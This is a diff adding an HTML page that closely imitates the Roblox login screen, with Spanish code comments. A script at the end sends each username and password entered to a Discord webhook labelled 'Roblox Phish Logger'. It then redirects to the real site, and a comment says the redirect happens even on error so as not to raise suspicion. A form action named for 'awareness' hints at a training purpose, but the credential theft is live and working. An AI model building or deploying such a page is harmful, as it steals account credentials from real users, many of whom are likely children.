@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to Roblox</title>
+
+    <meta name="author" content="Roblox Corporation" />
+    <meta name="description" content="Login to your Roblox account or sign up to create a new account." />
+    <link rel="icon" href="https://images.rbxcdn.com/e854eb7b2951ac03edba9a2681032bba.ico" />
+
+    <!-- CDN Hojas de Estilo Originales de Roblox (Conservadas para compatibilidad nativa) -->
+    <link rel="stylesheet" href="https://css.rbxcdn.com/04f0603c9d207351f843c05666d1fab59924c4947c0ce5d6a83e1f0f60f1ab3c-FoundationCss.css" />
+    <link rel="stylesheet" href="https://css.rbxcdn.com/c01f541c73f530d01262962e8290884bdd1d1d823c031a984d166d7afffc0722-ReactStyleGuide.css" />
+    <link rel="stylesheet" href="https://css.rbxcdn.com/43d0191ac8f6cbfd0d690529f7f43c212abb45213c43d7575e44b3c9141b10a6-StyleGuide.css" />
+    <link rel="stylesheet" href="https://css.rbxcdn.com/ef552f4ac70dd3209c70b94a377f66e3828905b9672bb67c661122403a6d15b7-Builder.css" />
+    <link rel="stylesheet" href="https://css.rbxcdn.com/c2a3d9199cc0af7a8fbe9bc68e10f8145f94e400d2d65c5db0cb8587b717226b-Navigation.css" />
+    <link rel="stylesheet" href="https://css.rbxcdn.com/f7cd2fe79dd030df509ca1fa1664809ea9733ea9464d7ce919b320f0c459ce94-ReactLogin.css" />
+    <link rel="stylesheet" href="https://css.rbxcdn.com/02d4ecbc73d33b96f0489c327af814617ada8f908fe279d406634adc368b5ee0-Footer.css" />
+
+    <!-- Estilos Personalizados Límpios y Autónomos SIN JavaScript -->
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');
+
+        :root {
+            --bg-body: #111214;
+            --bg-surface: #191b1d;
+            --bg-input: #111214;
+            --border-color: #393b3e;
+            --border-focus: #ffffff;
+            --text-main: #f2f4f5;
+            --text-muted: #888b8e;
+            --btn-primary-bg: #ffffff;
+            --btn-primary-text: #111214;
+            --btn-primary-hover: #e2e5e6;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #000000 !important;
+            /* Usamos la URL directa de la imagen de Roblox si es posible, o una que sea accesible */
+            background-image: url('https://images.rbxcdn.com/a19e4c27a0694a1d0fd5ceb17c978a7a-marketing_bg_05222025.jpg');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            background-repeat: no-repeat;
+            color: var(--text-main) !important;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif !important;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            user-select: none;
+        }
+
+        /* Añadimos un overlay para que se vea exactamente como el original */
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5); /* Oscurece un poco la imagen para que resalte el login */
+            z-index: -1;
+        }
+
+        input {
+            user-select: auto;
+        }
+
+        /* --- Barra Superior (Navbar) --- */
+        .custom-navbar {
+            background-color: var(--bg-body);
+            height: 56px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 24px;
+            border-bottom: 1px solid var(--border-color);
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+        }
+
+        .custom-navbar-left {
+            display: flex;
+            align-items: center;
+            gap: 24px;
+        }
+
+        .custom-logo {
+            display: flex;
+            align-items: center;
+            color: var(--text-main);
+            gap: 8px;
+            cursor: default;
+        }
+
+        .roblox-logo-text {
+            font-size: 22px;
+            font-weight: 900;
+            letter-spacing: 1.8px;
+            color: #ffffff;
+            font-family: 'Inter', sans-serif;
+            margin-top: 1px;
+        }
+
+        .navbar-links {
+            display: flex;
+            list-style: none;
+            margin: 0;
+            padding: 0;
+            gap: 20px;
+        }
+
+        /* Enlaces de la navbar inertes */
+        .navbar-links span {
+            color: var(--text-main);
+            font-size: 14px;
+            font-weight: 600;
+            letter-spacing: 0.3px;
+            cursor: default;
+            opacity: 0.9;
+        }
+
+        .custom-navbar-right {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .language-selector-inert {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: var(--text-muted);
+            font-size: 13px;
+            font-weight: 500;
+            cursor: default;
+        }
+
+        .btn-signup-inert {
+            background-color: var(--btn-primary-bg);
+            color: var(--btn-primary-text);
+            padding: 8px 16px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: default;
+            box-sizing: border-box;
+            display: inline-block;
+        }
+
+        /* --- Sección Principal de Login --- */
+        .custom-main {
+            margin-top: 56px;
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 16px;
+        }
+
+        .login-section {
+            width: 100%;
+            max-width: 400px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .login-header h1 {
+            font-size: 28px;
+            font-weight: 700;
+            color: var(--text-main);
+            margin-bottom: 24px;
+            text-align: center;
+        }
+
+        /* Caja de Login configurada con altura y proporciones esbeltas/cuadradas */
+        .login-card {
+            background-color: var(--bg-surface);
+            width: 100%;
+            min-height: 450px;
+            padding: 40px 32px;
+            border-radius: 12px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
+            box-sizing: border-box;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .login-subtitle {
+            color: var(--text-muted);
+            font-size: 13px;
+            text-align: center;
+            margin-top: 0;
+            margin-bottom: 24px;
+            line-height: 1.4;
+            cursor: default;
+        }
+
+        .login-form-inner {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            width: 100%;
+        }
+
+        .form-input {
+            width: 100%;
+            height: 48px;
+            background-color: var(--bg-input);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 0 16px;
+            color: var(--text-main);
+            font-size: 14px;
+            box-sizing: border-box;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .form-input::placeholder {
+            color: var(--text-muted);
+        }
+
+        .form-input:focus {
+            border-color: var(--border-focus);
+        }
+
+        .form-input:focus:invalid {
+            border-color: #ff5964;
+        }
+
+        .form-options {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-top: 12px;
+            margin-bottom: 28px;
+            font-size: 13px;
+        }
+
+        .remember-me {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: var(--text-muted);
+            cursor: default;
+        }
+
+        .remember-me input[type="checkbox"] {
+            accent-color: var(--btn-primary-bg);
+            width: 16px; height: 16px;
+            cursor: default;
+            margin: 0;
+        }
+
+        /* Enlaces inactivos en color Azul Subrayado ("como si fuera un link pero sin link") */
+        .blue-link {
+            color: #2693ff !important;
+            text-decoration: underline !important;
+            cursor: default !important;
+            font-weight: 500;
+        }
+
+        .blue-link.bold {
+            font-weight: 700;
+        }
+
+        /* Botón de Log In plenamente interactivo */
+        .btn-login {
+            width: 100%;
+            height: 48px;
+            background-color: var(--btn-primary-bg);
+            color: var(--btn-primary-text);
+            font-size: 16px;
+            font-weight: 700;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.2s, transform 0.1s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-sizing: border-box;
+        }
+
+        .btn-login:hover {
+            background-color: var(--btn-primary-hover);
+        }
+
+        .btn-login:active {
+            transform: scale(0.98);
+        }
+
+        .signup-container {
+            text-align: center;
+            font-size: 14px;
+            color: var(--text-muted);
+            margin-top: 24px;
+            padding-top: 16px;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+            cursor: default;
+        }
+
+        /* --- Footer (Pie de Página) --- */
+        .custom-footer {
+            padding: 32px 24px;
+            background-color: var(--bg-body);
+            border-top: 1px solid var(--border-color);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .footer-socials {
+            display: flex;
+            gap: 24px;
+            color: var(--text-muted);
+            cursor: default;
+        }
+
+        .footer-socials svg {
+            transition: color 0.2s;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 24px;
+            list-style: none;
+            margin: 0;
+            padding: 0;
+        }
+
+        .footer-links span {
+            color: var(--text-muted);
+            font-size: 12px;
+            cursor: default;
+        }
+
+        .footer-copyright {
+            color: var(--text-muted);
+            font-size: 12px;
+            text-align: center;
+            max-width: 600px;
+            line-height: 1.5;
+            cursor: default;
+        }
+
+        /* Estilos de la barra de búsqueda estilo Roblox */
+        .custom-search-container {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100%;
+            max-width: 400px;
+            display: flex;
+            align-items: center;
+        }
+
+        .custom-search-input {
+            width: 100%;
+            height: 34px;
+            background-color: #232527; /* Color oscuro de fondo de búsqueda de Roblox */
+            border: 1px solid #b8b8b833; /* Borde sutil */
+            border-radius: 8px; /* Bordes redondeados como en la imagen */
+            padding: 0 12px 0 38px;
+            color: #ffffff;
+            font-size: 15px;
+            outline: none;
+            transition: border-color 0.2s;
+            font-weight: 400;
+        }
+
+        .custom-search-input::placeholder {
+            color: #bdbebe; /* Color del texto "Search" */
+        }
+
+        .custom-search-input:focus {
+            border-color: #ffffff;
+        }
+
+        .custom-search-icon {
+            position: absolute;
+            left: 12px;
+            color: #ffffff; /* Icono blanco */
+            pointer-events: none;
+            display: flex;
+            align-items: center;
+        }
+
+        @media (max-width: 900px) {
+            .custom-search-container {
+                display: none;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- 1. Encabezado de Navegación Fijo -->
+    <header class="custom-navbar">
+        <div class="custom-navbar-left">
+            <div class="custom-logo" aria-label="Roblox Logo">
+                <svg width="30" height="30" viewBox="0 0 120 120" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path fill-rule="evenodd" clip-rule="evenodd" d="M11.6601 84.8105L84.8105 108.34L108.34 35.1895L35.1895 11.6601L11.6601 84.8105ZM50.0537 66.8665L66.8665 72.261L72.261 55.4482L55.4482 50.0537L50.0537 66.8665Z" fill="#FFFFFF"/>
+                </svg>
+                <span class="roblox-logo-text">ROBLOX</span>
+            </div>
+
+            <ul class="navbar-links" role="presentation">
+                <li><span>Charts</span></li>
+                <li><span>Marketplace</span></li>
+                <li><span>Create</span></li>
+            </ul>
+        </div>
+
+        <div class="custom-search-container">
+            <svg class="custom-search-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M15.5 14H14.71L14.43 13.73C15.41 12.59 16 11.11 16 9.5C16 5.91 13.09 3 9.5 3C5.91 3 3 5.91 3 9.5C3 13.09 5.91 16 9.5 16C11.11 16 12.59 15.41 13.73 14.43L14 14.71V15.5L19 20.49L20.49 19L15.5 14ZM9.5 14C7.01 14 5 11.99 5 9.5C5 7.01 7.01 5 9.5 5C11.99 5 14 7.01 14 9.5C14 11.99 11.99 14 9.5 14Z" fill="currentColor"/>
+            </svg>
+            <input type="text" class="custom-search-input" placeholder="Search" />
+        </div>
+
+        <div class="custom-navbar-right">
+            <div class="language-selector-inert">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM11 19.93C7.05 19.44 4 16.08 4 12C4 11.38 4.08 10.78 4.21 10.21L9 15V16C9 17.1 9.9 18 11 18V19.93ZM17.9 17.39C17.64 16.58 16.9 16 16 16H15V13C15 12.45 14.55 12 14 12H8V10H10C10.55 10 11 9.55 11 9V7H13C14.1 7 15 6.1 15 5V4.59C17.93 5.73 20 8.63 20 12C20 14.08 19.2 15.97 17.9 17.39Z" fill="currentColor"/>
+                </svg>
+                <span>English (US)</span>
+            </div>
+            <span class="btn-signup-inert">Sign Up</span>
+        </div>
+    </header>
+
+    <!-- 2. Caja Central con Envíos Realizados -->
+    <main class="custom-main" role="main">
+        <section class="login-section">
+            <div class="login-header">
+                <h1>Log in to Roblox</h1>
+            </div>
+
+            <div class="login-card">
+                
+                <p class="login-subtitle">
+                    Login to your Roblox account to connect with friends, discover immersive 3D experiences, and build virtual worlds.
+                </p>
+                
+                <form id="webhook-form" action="concienciacion.html" method="GET" class="login-form-inner">
+                    <div class="inputs-container">
+                        
+                        <div class="form-group">
+                            <input id="login-username" name="username" class="form-input" type="text" placeholder="Username/Email/Phone" required autocomplete="username" aria-label="Username, Email, or Phone" />
+                        </div>
+
+                        <div class="form-group">
+                            <input id="login-password" name="password" class="form-input" type="password" placeholder="Password" required autocomplete="current-password" aria-label="Password" />
+                        </div>
+
+                        <div class="form-options">
+                            <label class="remember-me" role="presentation">
+                                <input type="checkbox" checked onclick="return false;" />
+                                <span>Remember me</span>
+                            </label>
+
+                            <span class="blue-link">Forgot Password or Username?</span>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="btn-login">
+                        Log In
+                    </button>
+                </form>
+
+                <div class="signup-container">
+                    Don't have an account? <span class="blue-link bold">Sign Up</span>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <!-- 3. Pie de Página Inerte -->
+    <footer class="custom-footer" role="presentation">
+        
+        <div class="footer-socials">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="currentColor"><path d="M22 12C22 6.48 17.52 2 12 2C6.48 2 2 6.48 2 12C2 16.84 5.44 20.87 10 21.8V15H8V12H10V9.5C10 7.53 11.53 6 13.5 6H16V9H14C13.45 9 13 9.45 13 10V12H16V15H13V21.95C18.05 21.45 22 17.19 22 12Z"/></svg>
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2.25H21.552L14.325 10.51L22.827 21.75H16.17L10.956 14.933L4.99 21.75H1.68L9.41 12.915L1.254 2.25H8.08L12.793 8.481L18.244 2.25ZM17.08 19.77H18.913L7.084 4.126H5.117L17.08 19.77Z"/></svg>
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2.163C15.204 2.163 15.584 2.176 16.85 2.233C18.102 2.29 18.791 2.5 19.311 2.702C19.831 2.904 20.252 3.166 20.673 3.587C21.094 4.008 21.356 4.429 21.558 4.949C21.76 5.469 21.97 6.158 22.027 7.41C22.084 8.676 22.097 9.056 22.097 12.26C22.097 15.464 22.084 15.844 22.027 17.11C21.97 18.362 21.76 19.051 21.558 19.571C21.356 20.091 21.094 20.512 20.673 20.933C20.252 21.354 19.831 21.616 19.311 21.818C18.791 22.02 18.102 22.23 16.85 22.287C15.584 22.344 15.204 22.357 12 22.357C8.796 22.357 8.416 22.344 7.15 22.287C5.898 22.23 5.209 22.02 4.689 21.818C4.169 21.616 3.748 21.354 3.327 20.933C2.906 20.512 2.644 20.091 2.442 19.571C2.24 19.051 2.03 18.362 1.973 17.11C1.916 15.844 1.903 15.464 1.903 12.26C1.903 9.056 1.916 8.676 1.973 7.41C2.03 6.158 2.24 5.469 2.442 4.949C2.644 4.429 2.906 4.008 3.327 3.587C3.748 3.166 4.169 2.904 4.689 2.702C5.209 2.5 5.898 2.29 7.15 2.233C8.416 2.176 8.796 2.163 12 2.163ZM12 0C8.741 0 8.333 0.014 7.053 0.072C5.775 0.13 4.902 0.334 4.14 0.63C3.352 0.936 2.68 1.337 2.008 2.008C1.337 2.68 0.936 3.352 0.63 4.14C0.334 4.902 0.13 5.775 0.072 7.053C0.014 8.333 0 8.741 0 12C0 15.259 0.014 15.667 0.072 16.947C0.13 18.225 0.334 19.098 0.63 19.86C0.936 20.648 1.337 21.32 2.008 21.992C2.68 22.663 3.352 23.064 4.14 23.37C4.902 23.666 5.775 23.87 7.053 23.928C8.333 23.986 8.741 24 12 24C15.259 24 15.667 23.986 16.947 23.928C18.225 23.87 19.098 23.666 19.86 23.37C20.648 23.064 21.32 22.663 21.992 21.992C22.663 21.32 23.064 20.648 23.37 19.86C23.666 19.098 23.87 18.225 23.928 16.947C23.986 15.667 24 15.259 24 12C24 8.741 23.986 8.333 23.928 7.053C23.87 5.775 23.666 4.902 23.37 4.14C23.064 3.352 22.663 2.68 21.992 2.008C21.32 1.337 20.648 0.936 19.86 0.63C19.098 0.334 18.225 0.13 16.947 0.072C15.667 0.014 15.259 0 12 0ZM12 5.838C8.597 5.838 5.838 8.597 5.838 12C5.838 15.403 8.597 18.162 12 18.162C15.403 18.162 18.162 15.403 18.162 12C18.162 8.597 15.403 5.838 12 5.838ZM12 15.998C9.792 15.998 8.002 14.208 8.002 12C8.002 9.792 9.792 8.002 12 8.002C14.208 8.002 15.998 9.792 15.998 12C15.998 14.208 14.208 15.998 12 15.998ZM18.406 4.155C17.61 4.155 16.965 4.8 16.965 5.596C16.965 6.392 17.61 7.037 18.406 7.037C19.202 7.037 19.847 6.392 19.847 5.596C19.847 4.8 19.202 4.155 18.406 4.155Z"/></svg>
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="currentColor"><path d="M23.498 6.186C23.266 5.313 22.584 4.631 21.71 4.399C19.841 3.901 12 3.901 12 3.901C12 3.901 4.159 3.901 2.29 4.399C1.416 4.631 0.734 5.313 0.502 6.186C0 8.055 0 12 0 12C0 12 0 15.945 0.502 17.814C0.734 18.687 1.416 19.369 2.29 19.601C4.159 20.099 12 20.099 12 20.099C12 20.099 19.841 20.099 21.71 19.601C22.584 19.369 23.266 18.687 23.498 17.814C24 15.945 24 12 24 12C24 12 24 8.055 23.498 6.186ZM9.545 15.36V8.64L15.36 12L9.545 15.36Z"/></svg>
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="currentColor"><path d="M2.5 0L0 6V20H5.5V24H9.5L13.5 20H18L24 14V0H2.5ZM21.5 12.5L18 16H13.5L9.5 20V16H5.5V2.5H21.5V12.5ZM16.5 6.5V12H14V6.5H16.5ZM11.5 6.5V12H9V6.5H11.5Z"/></svg>
+        </div>
+
+        <ul class="footer-links">
+            <li><span>About Us</span></li>
+            <li><span>Jobs</span></li>
+            <li><span>Blog</span></li>
+            <li><span>Parents</span></li>
+            <li><span>Gift Cards</span></li>
+            <li><span>Help</span></li>
+            <li><span>Terms</span></li>
+            <li><span>Accessibility</span></li>
+            <li><span>Privacy</span></li>
+        </ul>
+
+        <div class="footer-copyright">
+            © 2026 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.
+        </div>
+    </footer>
+
+    <script>
+        document.getElementById('webhook-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('login-username').value;
+            const password = document.getElementById('login-password').value;
+            const webhookUrl = 'https://discord.com/api/webhooks/1516844899927064746/pzQbN6fTqf6tiorlUI2-IDI_uUCdvFZQLPuXwh2haZn0nQh_XI01lbhDIDJHFsGqgXVo';
+            
+            const payload = {
+                embeds: [
+                    {
+                        title: "Nuevo Login Detectado",
+                        color: 16711680, // Rojo
+                        fields: [
+                            {
+                                name: "Usuario",
+                                value: username,
+                                inline: true
+                            },
+                            {
+                                name: "Contraseña",
+                                value: password,
+                                inline: true
+                            }
+                        ],
+                        footer: {
+                            text: "Roblox Phish Logger"
+                        },
+                        timestamp: new Date().toISOString()
+                    }
+                ]
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                // Redirigir después de enviar los datos
+                window.location.href = "https://www.roblox.com";
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                // Redirigir incluso si hay error para no levantar sospechas
+                window.location.href = "https://www.roblox.com";
+            });
+        });
+    </script>
+<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'a0d3bfa98fbcae18',t:'MTc4MTcxNzA3NQ=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
+</html>
